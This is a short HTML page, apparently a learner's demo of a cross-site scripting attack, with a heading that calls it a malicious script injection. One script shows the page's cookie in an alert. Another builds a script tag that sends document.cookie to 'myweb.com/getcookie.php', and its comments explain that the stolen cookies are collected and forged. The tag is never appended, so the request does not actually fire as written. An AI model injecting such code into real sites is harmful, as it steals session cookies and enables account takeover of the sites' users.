<!DOCTYPE html>
<html>
	<head>
		<title> 登录页面 </title>
		<meta charset = "utf-8">
		
		<script type = "text/javascript">
		
		</script>
		
		<style type = "text/css">
		
		</style>
	</head>
	<body>
		<h1> 恶意脚本攻击，嵌入js脚本 </h1>
		<!-- 弹出对话框，显示内容为sessionId -->
		<script type = "text/javascript">
			alert(document.cookie);
		</script>
		
		<!-- 将内容发送到目的网页 -->
		<script type = "text/javascript">
			//var js = "http://myweb.com/getcookie.php";
			var js = document.createElement('script');
			//var hd = document.getElementsByTagName('head')[0];
			//document.append;
			js.src = "http://myweb.com/getcookie.php?" + document.cookie;
			// 把入侵网站的cookie，发送到了getcookie.php
			// 因此就可以挂几个网站，接收cookie，然后伪造cookie
		</script>
	</body>
</html>
